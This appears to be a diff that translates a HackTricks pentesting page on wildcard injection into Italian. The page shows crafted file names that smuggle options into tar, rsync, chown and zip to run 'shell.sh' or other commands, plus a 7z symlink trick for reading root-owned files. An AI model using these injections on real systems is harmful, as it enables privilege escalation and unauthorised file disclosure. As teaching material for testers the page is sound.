@@ -1,104 +1,85 @@
-
-
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Altri modi per supportare HackTricks:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
+* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
+* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT**](https://opensea.io/collection/the-peass-family) esclusivi
+* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Condividi i tuoi trucchi di hacking inviando PR ai repository github di** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
 
 
 ## chown, chmod
 
-You can **indicate which file owner and permissions you want to copy for the rest of the files**
-
+Puoi **indicare quale proprietario di file e permessi vuoi copiare per il resto dei file**
 ```bash
 touch "--reference=/my/own/path/filename"
 ```
-
-You can exploit this using [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(combined attack)_\
-More info in [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)
+Puoi sfruttare questo utilizzando [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(attacco combinato)_\
+Ulteriori informazioni su [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)
 
 ## Tar
 
-**Execute arbitrary commands:**
-
+**Esegui comandi arbitrari:**
 ```bash
 touch "--checkpoint=1"
 touch "--checkpoint-action=exec=sh shell.sh"
 ```
-
-You can exploit this using [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(tar attack)_\
-More info in [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)
+Puoi sfruttare questo utilizzando [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(attacco tar)_\
+Ulteriori informazioni su [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)
 
 ## Rsync
 
-**Execute arbitrary commands:**
-
+**Esegui comandi arbitrari:**
 ```bash
 Interesting rsync option from manual:
 
- -e, --rsh=COMMAND           specify the remote shell to use
-     --rsync-path=PROGRAM    specify the rsync to run on remote machine
+-e, --rsh=COMMAND           specify the remote shell to use
+--rsync-path=PROGRAM    specify the rsync to run on remote machine
 ```
 
 ```bash
 touch "-e sh shell.sh"
 ```
-
-You can exploit this using [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(_rsync _attack)_\
-More info in [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)
+Puoi sfruttare questo utilizzando [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(attacco rsync)_\
+Ulteriori informazioni su [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)
 
 ## 7z
 
-In **7z** even using `--` before `*` (note that `--` means that the following input cannot treated as parameters, so just file paths in this case) you can cause an arbitrary error to read a file, so if a command like the following one is being executed by root:
-
+In **7z** anche utilizzando `--` prima di `*` (nota che `--` significa che l'input successivo non può essere trattato come parametri, quindi solo percorsi dei file in questo caso) puoi causare un errore arbitrario per leggere un file, quindi se un comando come il seguente viene eseguito da root:
 ```bash
 7za a /backup/$filename.zip -t7z -snl -p$pass -- *
 ```
-
-And you can create files in the folder were this is being executed, you could create the file `@root.txt` and the file `root.txt` being a **symlink** to the file you want to read:
-
+E puoi creare file nella cartella in cui viene eseguito questo, potresti creare il file `@root.txt` e il file `root.txt` che è un **symlink** al file che desideri leggere:
 ```bash
 cd /path/to/7z/acting/folder
 touch @root.txt
 ln -s /file/you/want/to/read root.txt
 ```
+Quindi, quando **7z** viene eseguito, tratterà `root.txt` come un file contenente l'elenco dei file che dovrebbe comprimere (è ciò che indica l'esistenza di `@root.txt`) e quando 7z legge `root.txt`, leggerà `/file/you/want/to/read` e **poiché il contenuto di questo file non è un elenco di file, genererà un errore** mostrando il contenuto.
 
-Then, when **7z** is execute, it will treat `root.txt` as a file containing the list of files it should compress (thats what the existence of `@root.txt` indicates) and when it 7z read `root.txt` it will read `/file/you/want/to/read` and **as the content of this file isn't a list of files, it will throw and error** showing the content.
-
-_More info in Write-ups of the box CTF from HackTheBox._
+_Maggiori informazioni nei resoconti del box CTF di HackTheBox._
 
 ## Zip
 
-**Execute arbitrary commands:**
-
+**Eseguire comandi arbitrari:**
 ```bash
 zip name.zip files -T --unzip-command "sh -c whoami"
 ```
-
-
-
-
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Altri modi per supportare HackTricks:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
+* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
+* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
+* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Condividi i tuoi trucchi di hacking inviando PR ai repository github di** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
-
-
